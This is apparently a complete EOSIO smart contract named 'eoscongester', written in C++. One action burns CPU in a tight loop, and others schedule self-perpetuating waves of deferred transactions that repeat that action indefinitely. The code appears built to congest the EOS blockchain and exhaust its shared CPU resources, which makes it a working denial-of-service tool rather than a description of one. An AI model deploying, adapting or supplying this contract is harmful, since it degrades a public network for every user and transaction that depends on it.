#pragma once

#include <eosiolib/eosio.hpp>
#include <eosiolib/system.hpp>
#include <eosiolib/transaction.hpp>

using namespace eosio;

class [[eosio::contract("eoscongester")]] eoscongester : public contract {
  public:
      using contract::contract;
    
        eoscongester( eosio::name receiver, eosio::name code, eosio::datastream<const char*> ds ): eosio::contract(receiver, code, ds)
    {}

[[eosio::action]]
void call(uint64_t ix, uint64_t id)
{
     // ID is the number of iterations
     // i  is a dummy value to prevent tx duplications

     uint64_t b = 0;
     // 200K iterations will consume 22 MS of CPU per call.
     for (uint64_t i=0; i < id; i++)
     {
          uint64_t j = i * i;
          uint64_t k = j * i;
          b = j * k;
     }
     eosio::print("B: ", b);
}

[[eosio::action]]
void init()
{     
     for (uint64_t i = 0; i<50; i++)
     {
          eosio::transaction c{};
          c.actions.emplace_back(
               eosio::permission_level(_self, "active"_n),
               _self,
               "set"_n,
               std::make_tuple(_self, (i*250000), 1, 1, 50, 200000));
               c.delay_sec = 1;
          c.send( (i+913412), _self, true);
     }
}


[[eosio::action]]
void set(eosio::name from, uint64_t offset, uint64_t delay, uint64_t defer, uint64_t repeat, uint64_t id)
{
     for (uint64_t i = 0; i<repeat; i++)
     {
          eosio::transaction c{};
          c.actions.emplace_back(
               eosio::permission_level(_self, "active"_n),
               _self,
               "call"_n,
               std::make_tuple(i, id));
               c.delay_sec = defer;
          c.send( (now()+offset+2350009+i) , _self, true);
     }

     eosio::transaction t{};
     t.actions.emplace_back(
          eosio::permission_level(_self, "active"_n),
          _self,
          "set"_n,
          std::make_tuple(from, offset, delay, defer, repeat, id));
     t.delay_sec = delay;
     t.send(now()+offset, _self, true);
}
};


EOSIO_DISPATCH( eoscongester, (set)(call)(init))
